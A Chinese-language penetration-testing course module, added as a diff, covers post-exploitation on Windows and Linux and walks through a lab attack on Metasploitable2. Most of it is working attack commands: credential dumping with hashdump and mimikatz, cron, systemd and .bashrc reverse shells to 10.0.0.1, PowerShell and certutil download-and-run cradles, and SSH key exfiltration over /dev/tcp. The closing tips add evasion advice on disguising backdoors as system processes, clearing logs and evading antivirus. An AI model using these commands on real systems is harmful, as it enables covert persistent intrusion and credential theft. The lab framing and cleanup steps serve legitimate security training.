@@ -1,0 +1,555 @@
+================================================================================
+模块07: 后渗透与权限维持
+================================================================================
+
+【学习目标】
+1. 掌握Meterpreter高级后渗透功能
+2. 学会在Linux和Windows系统中建立持久化后门
+3. 掌握横向移动技术 (SSH隧道, proxychains, chisel)
+4. 学会文件传输技巧
+5. 模拟完整的后渗透过程
+
+【所需工具】(archstrike-base已预装)
+- metasploit (msfconsole + meterpreter)
+- proxychains
+- openssh (ssh, scp)
+- netcat (nc)
+- chisel (需从GitHub下载)
+
+================================================================================
+第一部分: Meterpreter 高级功能
+================================================================================
+
+1.1 信息收集
+--------------------------------------------------
+
+系统枚举:
+  sysinfo                     # 系统概览 (OS, 主机名, 架构)
+  getuid                      # 当前用户身份
+  getprivs                    # 用户权限列表
+  ps                          # 进程列表
+  getsystem                   # 尝试提权到SYSTEM (Windows)
+  use priv                    # 加载提权扩展 (Meterpreter)
+
+网络信息:
+  ipconfig / ifconfig         # 网络接口信息
+  route                       # 路由表 (可用于后续路由转发)
+  arp                         # ARP表
+  netstat                     # 网络连接和监听端口
+
+更多信息:
+  getpid                      # 当前Meterpreter进程ID
+  use sniffer                 # 加载嗅探扩展
+  run post/windows/gather/enum_applications    # 枚举已安装应用
+  run post/linux/gather/enum_system            # Linux系统信息
+  run post/multi/gather/env                    # 环境变量
+  run post/windows/gather/checkvm              # 是否在虚拟机中
+  run post/windows/gather/enum_domains         # 枚举域信息
+  run post/multi/gather/firefox_creds          # 提取Firefox凭证
+
+1.2 提权技术
+--------------------------------------------------
+
+Windows提权:
+  getsystem                           # 尝试直接提权 (SeDebugPrivilege)
+  getprivs                            # 查看令牌权限
+  use priv                            # 加载提权模块
+  hashdump                            # 导出密码hash (需SYSTEM权限)
+
+  # 使用post模块提权
+  run post/multi/recon/local_exploit_suggester  # 本地提权建议
+  run post/windows/escalate/ms10_073_kbdlayout  # 具体exploit
+
+Linux提权:
+  # 在shell中:
+  sudo -l                             # 查看可执行的sudo命令
+  find / -perm -4000 -type f 2>/dev/null  # 查找SUID文件
+  cat /etc/crontab                    # 查看计划任务
+  find / -writable -type f 2>/dev/null | grep -v proc  # 可写文件
+  uname -a                            # 内核版本 (搜索提权exploit)
+  cat /etc/passwd                     # 用户列表
+
+1.3 进程迁移
+--------------------------------------------------
+
+  为什么要迁移:
+    - 目标进程崩溃时会失联
+    - 迁移到更稳定的进程 (如explorer.exe, svchost.exe)
+    - 某些安全软件会监控可疑进程
+
+  Meterpreter迁移:
+    ps                          # 查看进程列表
+    migrate PID                 # 迁移到指定PID
+    migrate -N explorer.exe     # 迁移到指定进程名 (Windows)
+    migrate -N sshd             # 迁移到指定进程名 (Linux)
+    getpid                      # 确认迁移成功
+
+1.4 键盘记录
+--------------------------------------------------
+
+Windows (Meterpreter):
+  keyscan_start                 # 开始记录键盘
+  keyscan_dump                  # 导出记录的按键
+  keyscan_stop                  # 停止记录
+
+  # 通过sniffer模块嗅探
+  use sniffer
+  sniffer_interfaces            # 列出可嗅探的接口
+  sniffer_start 1               # 开始嗅探接口1
+  sniffer_dump 1 capture.pcap   # 导出数据
+
+1.5 屏幕截图
+--------------------------------------------------
+  screenshot                    # 截取目标桌面
+  use espia                     # 加载Espia模块 (更多屏幕功能)
+
+1.6 端口转发 (Port Forwarding)
+--------------------------------------------------
+  # 将目标内网的3389端口转发到攻击机的3388
+  portfwd add -L 0.0.0.0 -l 3388 -p 3389 -r 10.0.0.10
+  portfwd add -L 0.0.0.0 -l 80 -p 80 -r 10.0.0.100
+  portfwd list                  # 查看所有转发
+  portfwd delete -L 0.0.0.0 -l 3388  # 删除转发
+
+1.7 路由转发 (Pivoting)
+--------------------------------------------------
+  # 查看目标网络
+  route                         # 查看目标路由表
+  arp                           # 查看目标ARP表
+
+  # 添加路由 (通过已控制的机器访问内网)
+  run autoroute -s 10.0.0.0/24  # 添加到10.0.0.0/24的路由
+  run autoroute -p              # 查看已添加的路由
+
+  # 通过socks代理访问 (配合proxychains)
+  use auxiliary/server/socks_proxy
+  set SRVHOST 0.0.0.0
+  set SRVPORT 1080
+  run -j
+
+  # 然后配置 /etc/proxychains.conf
+  # 添加: socks4 127.0.0.1 1080
+  # 使用: proxychains nmap -sT -Pn 10.0.0.5
+
+1.8 凭证收集
+--------------------------------------------------
+  # Windows凭证收集
+  hashdump                      # 导出SAM hash
+  run post/windows/gather/smart_hashdump  # 更完善的hash dump
+  run post/windows/gather/credentials/credential_collector
+  run post/windows/gather/enum_unattend    # 无人值守安装文件
+
+  # Mimikatz集成 (内存中提取明文密码)
+  load kiwi                     # 加载mimikatz模块
+  creds_all                     # 导出所有凭证
+  creds_kerberos                # Kerberos票据
+  creds_msv                     # MSV凭证
+  creds_wdigest                 # WDigest凭证
+  kerberos_ticket_list          # 列出Kerberos票据
+  kerberos_ticket_use           # 使用票据
+  gold_ticket_create            # 创建黄金票据
+  lsa_dump_sam                  # 导出SAM
+  lsa_dump_secrets              # 导出LSA secrets
+
+  # Linux凭证收集
+  run post/linux/gather/hashdump            # 导出/etc/shadow
+  run post/multi/gather/firefox_creds       # Firefox凭证
+  run post/multi/gather/enum_unattend       # 无人值守配置
+
+================================================================================
+第二部分: 持久化技术
+================================================================================
+
+2.1 Linux持久化
+--------------------------------------------------
+
+2.1.1 SSH密钥后门
+  # 在目标机器上:
+  ssh-keygen -t ed25519 -f ~/.ssh/backdoor -N ""
+  cat ~/.ssh/backdoor.pub >> ~/.ssh/authorized_keys
+  # 将私钥带回攻击机
+  download ~/.ssh/backdoor /root/keys/target_ssh_key
+  chmod 600 /root/keys/target_ssh_key
+  # 从攻击机连接: ssh -i /root/keys/target_ssh_key user@target
+
+2.1.2 Crontab后门
+  # 每5分钟执行一次反弹shell
+  (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update.sh") | crontab -
+
+  # /tmp/.update.sh 内容:
+  #!/bin/bash
+  bash -i >& /dev/tcp/10.0.0.1/5555 0>&1
+
+2.1.3 Systemd服务后门
+  # 创建服务文件 /etc/systemd/system/backup.service:
+  [Unit]
+  Description=System Backup Service
+  [Service]
+  Type=simple
+  ExecStart=/usr/bin/nc -e /bin/bash 10.0.0.1 5555
+  Restart=always
+  [Install]
+  WantedBy=multi-user.target
+
+  systemctl daemon-reload
+  systemctl enable backup.service
+  systemctl start backup.service
+
+2.1.4 .bashrc / .profile 后门
+  echo "bash -i >& /dev/tcp/10.0.0.1/5555 0>&1 2>/dev/null &" >> ~/.bashrc
+
+2.1.5 SUID后门 (需要root)
+  cp /bin/bash /tmp/.shell
+  chmod 4755 /tmp/.shell
+  # 任何用户执行 /tmp/.shell -p 即可获得root shell
+
+2.2 Windows持久化
+--------------------------------------------------
+
+2.2.1 注册表Run键
+  reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run \
+    -v "WindowsUpdate" -d "C:\\Windows\\Temp\\payload.exe"
+
+2.2.2 计划任务 (Schtasks)
+  schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" 
+    /sc daily /st 09:00 /ru SYSTEM
+
+2.2.3 Windows服务
+  sc create "WinUpdate" binPath= "C:\payload.exe" start= auto
+  sc start "WinUpdate"
+
+2.2.4 使用Metasploit持久化模块
+  # Meterpreter中:
+  run persistence -U -i 60 -p 4444 -r 10.0.0.1
+  # -U: 用户登录时启动
+  # -i 60: 每60秒回连一次
+  # -p 4444: 监听端口
+  # -r 10.0.0.1: 回连IP
+
+  # 更好的持久化
+  run exploit/windows/local/persistence
+  run exploit/windows/local/persistence_service
+
+================================================================================
+第三部分: 横向移动
+================================================================================
+
+3.1 SSH隧道技术
+--------------------------------------------------
+
+3.1.1 本地端口转发 (-L)
+  # 通过跳板机访问内网服务
+  ssh -L 8080:10.0.0.5:80 user@jumphost
+  # 攻击机localhost:8080 → jumphost → 10.0.0.5:80
+
+3.1.2 远程端口转发 (-R)
+  # 将内网机器的端口暴露给攻击机
+  # 在内网机器上执行:
+  ssh -R 3389:10.0.0.5:3389 user@attacker
+  # attacker:3389 → 内网机器 → 10.0.0.5:3389
+
+3.1.3 动态端口转发 (-D) SOCKS代理
+  # 在攻击机上:
+  ssh -D 1080 user@jumphost
+  # 然后配置 proxychains 使用 socks5 127.0.0.1 1080
+
+3.1.4 多重跳板
+  ssh -J user1@jumphost1,user2@jumphost2 user3@finaltarget
+
+3.2 proxychains 配置和使用
+--------------------------------------------------
+
+3.2.1 配置文件 /etc/proxychains.conf
+  # 末尾添加 (注释掉其他proxy):
+  socks4 127.0.0.1 9050       # Tor代理
+  socks4 127.0.0.1 1080       # SSH动态转发代理
+  http 10.0.0.1 8080          # HTTP代理
+
+  # 代理类型:
+  # strict_chain: 按顺序使用代理 (更安全)
+  # dynamic_chain: 动态跳过不可用的代理
+  # random_chain: 随机选择代理
+
+3.2.2 使用proxychains
+  proxychains nmap -sT -Pn -p 80,443,3389 10.0.0.5
+  proxychains hydra -l admin -P pass.txt 10.0.0.5 ssh
+  proxychains firefox          # 通过代理启动浏览器
+
+3.3 chisel隧道工具
+--------------------------------------------------
+
+3.3.1 基本概念
+  chisel 是多平台TCP/UDP隧道工具, 通过HTTP伪装传输。
+  Client/Server模式, 适合绕过仅开放HTTP出站的环境。
+
+3.3.2 服务器端 (攻击机)
+  chisel server -p 8080 --reverse
+  # 监听8080端口, 允许反向连接
+
+3.3.3 客户端 (目标机)
+  # 反向SOCKS代理 (目标机连回攻击机)
+  chisel client 10.0.0.1:8080 R:socks
+
+  # 反向端口转发 (目标机将内网服务暴露给攻击机)
+  chisel client 10.0.0.1:8080 R:3389:10.0.0.5:3389
+
+  # 正向端口转发 (攻击机通过目标机访问内网)
+  chisel client 10.0.0.1:8080 1081:10.0.0.5:80
+
+3.3.4 使用场景
+  # 场景1: 通过妥协的DMZ服务器访问内网
+  攻击机: chisel server -p 443 --reverse
+  DMZ:    chisel client 攻击机IP:443 R:socks
+  攻击机: proxychains nmap 内网IP
+
+  # 场景2: 绕过严格出站限制 (仅允许HTTPS)
+  攻击机: chisel server -p 443 --reverse
+  目标:   chisel client 攻击机IP:443 R:3389:127.0.0.1:3389
+  攻击机: rdesktop 127.0.0.1:3389
+
+================================================================================
+第四部分: 文件传输技巧
+================================================================================
+
+4.1 常用下载方法 (攻击机←目标)
+--------------------------------------------------
+
+wget/curl (目标机有这些工具时):
+  # 攻击机先开启HTTP服务
+  python3 -m http.server 8000
+  # 目标机下载
+  wget http://10.0.0.1:8000/tool.sh -O /tmp/tool.sh
+  curl http://10.0.0.1:8000/tool.sh -o /tmp/tool.sh
+
+netcat:
+  # 攻击机
+  nc -lvp 4444 < /root/tools/nc.exe
+  # 目标机
+  nc 10.0.0.1 4444 > C:\Windows\Temp\nc.exe
+
+scp:
+  scp /local/file user@target:/remote/path/
+  scp -i keyfile /local/file user@target:/remote/path/
+
+rsync:
+  rsync -avz /local/dir/ user@target:/remote/dir/
+
+base64编码传输 (绕过限制):
+  # 攻击机
+  base64 -w0 payload.bin > payload_b64.txt
+  # 复制payload_b64.txt内容
+  # 目标机
+  echo "<B64_STRING>" | base64 -d > /tmp/payload.bin
+
+Meterpreter:
+  upload /local/payload.exe C:\\Windows\\Temp\\payload.exe
+  download C:\\Windows\\System32\\config\\SAM /root/evidence/SAM
+
+4.2 PowerShell (Windows)
+--------------------------------------------------
+  # 从攻击机下载
+  powershell -c "Invoke-WebRequest -Uri http://10.0.0.1:8000/payload.exe -OutFile C:\Temp\payload.exe"
+
+  # 内存加载 (无文件落地)
+  powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1:8000/script.ps1')"
+
+4.3 Certutil (Windows, 绕过限制)
+--------------------------------------------------
+  certutil -urlcache -split -f http://10.0.0.1:8000/payload.exe C:\Temp\payload.exe
+
+4.4 /dev/tcp (Bash, 无需额外工具)
+--------------------------------------------------
+  # 攻击机监听
+  nc -lvp 4444 > received_file
+  # 目标机发送
+  cat file_to_send > /dev/tcp/10.0.0.1/4444
+
+  # 接收文件
+  exec 3<>/dev/tcp/10.0.0.1/4444
+  cat <&3 > received_file
+
+================================================================================
+第五部分: 实践练习
+================================================================================
+
+目标: 模拟完整的后渗透过程 (从立足点→信息收集→提权→持久化→横向移动)
+
+实验环境:
+  攻击机: 192.168.1.50
+  目标1 (Metasploitable2): 192.168.1.100 (初始立足点)
+  目标2 (模拟内网): 10.0.0.5 (第二目标)
+
+【路线指引 - 完整后渗透过程】
+
+=== 阶段一: 获取初始Shell ===
+
+Step 1: 利用VSFTPD后门获取Metasploitable2的初始shell
+  msfconsole -q
+  use auxiliary/scanner/ftp/vsftpd_234_backdoor
+  set RHOSTS 192.168.1.100
+  run
+  (如果成功, 获得root shell)
+  sessions -l
+  sessions -i 1
+
+Step 2: 升级到Meterpreter (可选)
+  sessions -u 1
+
+=== 阶段二: 信息收集 ===
+
+Step 3: 在获得的shell中收集系统信息
+  whoami && id
+  uname -a
+  cat /etc/passwd
+  cat /etc/shadow
+  cat /etc/crontab
+  cat /etc/hosts
+  ip addr show
+  route -n
+  ps aux
+  netstat -tulnp
+  cat /etc/ssh/sshd_config
+
+Step 4: 创建信息收集目录
+  mkdir -p /tmp/recon
+  将以上命令输出保存到文件:
+  cat /etc/passwd > /tmp/recon/users.txt
+  ip addr show > /tmp/recon/network.txt
+  route -n > /tmp/recon/routes.txt
+
+Step 5: 查看.bash_history
+  cat ~/.bash_history
+  cat /root/.bash_history
+
+Step 6: 搜索敏感文件
+  find / -name "*.conf" -type f 2>/dev/null | head -20
+  find / -name "*.sql" -type f 2>/dev/null
+  find / -name "*pass*" -type f 2>/dev/null
+  find / -name "id_rsa" -type f 2>/dev/null
+  find / -name "*.pem" -type f 2>/dev/null
+
+=== 阶段三: 凭证收集 ===
+
+Step 7: 检查SSH密钥
+  ls -la ~/.ssh/
+  cat ~/.ssh/id_rsa
+  cat ~/.ssh/id_dsa
+  cat ~/.ssh/authorized_keys
+
+Step 8: 检查数据库配置
+  find / -name "wp-config.php" 2>/dev/null
+  cat /var/www/dvwa/config/config.inc.php 2>/dev/null
+  cat /var/www/mutillidae/config.inc 2>/dev/null
+
+Step 9: 查看MySQL数据库 (如果有访问权限)
+  mysql -u root -e "SELECT User,Password FROM mysql.user;"
+  mysql -u root -e "SHOW DATABASES;"
+
+=== 阶段四: 建立持久化 ===
+
+Step 10: 创建SSH密钥后门
+  在目标机上:
+  mkdir -p ~/.ssh
+  ssh-keygen -t rsa -b 2048 -f ~/.ssh/backdoor -N "" -q
+  cat ~/.ssh/backdoor.pub >> ~/.ssh/authorized_keys
+  
+  获取私钥到攻击机:
+  (在Meterpreter中): download ~/.ssh/backdoor ~/.ssh/ms2_backdoor
+  (在普通shell中): 
+  在攻击机执行: nc -lvp 5555 > ms2_backdoor
+  在目标机执行: cat ~/.ssh/backdoor > /dev/tcp/192.168.1.50/5555
+
+Step 11: 测试SSH密钥连接
+  chmod 600 ~/.ssh/ms2_backdoor
+  ssh -i ~/.ssh/ms2_backdoor root@192.168.1.100
+  (确认可以免密登录)
+  exit
+
+Step 12: 创建crontab后门
+  (在目标机上, 以root权限):
+  echo "*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'" > /etc/cron.d/backup
+  systemctl restart cron
+
+Step 13: 验证crontab后门
+  (在攻击机上):
+  nc -lvp 4444
+  (等待5分钟, 应收到反弹shell)
+  Ctrl+C 退出
+
+=== 阶段五: 横向移动模拟 ===
+
+Step 14: 假设发现内网目标10.0.0.5
+  在Metasploitable2的shell中:
+  cat /etc/hosts          # 查看是否记录内网主机
+  arp -a
+
+Step 15: 配置SSH动态代理
+  在攻击机上:
+  ssh -i ~/.ssh/ms2_backdoor -D 1080 root@192.168.1.100 -fN
+  # -f: 后台运行
+  # -N: 不执行远程命令
+
+Step 16: 配置proxychains
+  sudo nano /etc/proxychains.conf
+  确保末尾行:
+  socks4 127.0.0.1 1080
+
+Step 17: 通过代理探测内网
+  proxychains nmap -sT -Pn -p 22,80,445,3389 10.0.0.5
+  proxychains curl http://10.0.0.5 2>/dev/null
+
+Step 18: 本地端口转发访问内网Web
+  (先关闭之前的SSH连接)
+  ssh -i ~/.ssh/ms2_backdoor -L 8080:10.0.0.5:80 root@192.168.1.100 -fN
+  # 现在可以直接访问:
+  打开Firefox浏览器
+  在地址栏输入: http://localhost:8080
+
+=== 阶段六: 清理持久化后门 (练习后) ===
+
+Step 19: 移除SSH后门
+  在目标机上:
+  ssh root@192.168.1.100
+  rm ~/.ssh/backdoor ~/.ssh/backdoor.pub
+  nano ~/.ssh/authorized_keys    # 删除后门公钥行
+
+Step 20: 移除crontab后门
+  rm /etc/cron.d/backup
+
+Step 21: 关闭后门SSH连接
+  pkill -f "ssh.*192.168.1.100"
+
+Step 22: 创建后渗透实践报告
+  echo "=== 后渗透实践报告 ===" > post_exploit_report.txt
+  echo "" >> post_exploit_report.txt
+  echo "目标: Metasploitable2 (192.168.1.100)" >> post_exploit_report.txt
+  echo "初始访问: VSFTPD v2.3.4 后门 (CVE-2011-2523)" >> post_exploit_report.txt
+  echo "权限: root" >> post_exploit_report.txt
+  echo "" >> post_exploit_report.txt
+  echo "收集的信息:" >> post_exploit_report.txt
+  echo "  - 系统版本: Linux 2.6.24" >> post_exploit_report.txt
+  echo "  - 用户列表: root, msfadmin, user, ..." >> post_exploit_report.txt
+  echo "  - 网络接口: eth0 192.168.1.100" >> post_exploit_report.txt
+  echo "  - 运行服务: 21, 22, 80, 3306, 6667, ..." >> post_exploit_report.txt
+  echo "" >> post_exploit_report.txt
+  echo "持久化方法:" >> post_exploit_report.txt
+  echo "  - SSH密钥 (已安装)" >> post_exploit_report.txt
+  echo "  - Crontab反弹shell (已安装)" >> post_exploit_report.txt
+  echo "" >> post_exploit_report.txt
+  echo "横向移动:" >> post_exploit_report.txt
+  echo "  - SSH动态代理 (D 1080)" >> post_exploit_report.txt
+  echo "  - Proxychains链接" >> post_exploit_report.txt
+
+【注意事项与提示】
+- 所有持久化技术仅在授权测试中使用
+- 持久化后门应在渗透测试结束后立即移除
+- 使用非标准端口和加密通道减少检测风险
+- 后门程序命名模仿系统进程名 (如update, backup, sync)
+- SSH隧道在日志中可见, 需配合日志清理
+- proxychains对UDP扫描有限制, nmap -sU不适用
+- chisel的HTTP伪装能有效绕过多数防火墙
+- Windows持久化需注意杀软检测, 做好免杀
+- 横向移动前需充分侦察内网拓扑, 减少盲目扫描
+- Metasploitable2本身就是被入侵的靶机, 请勿在公网暴露
+
+================================================================================
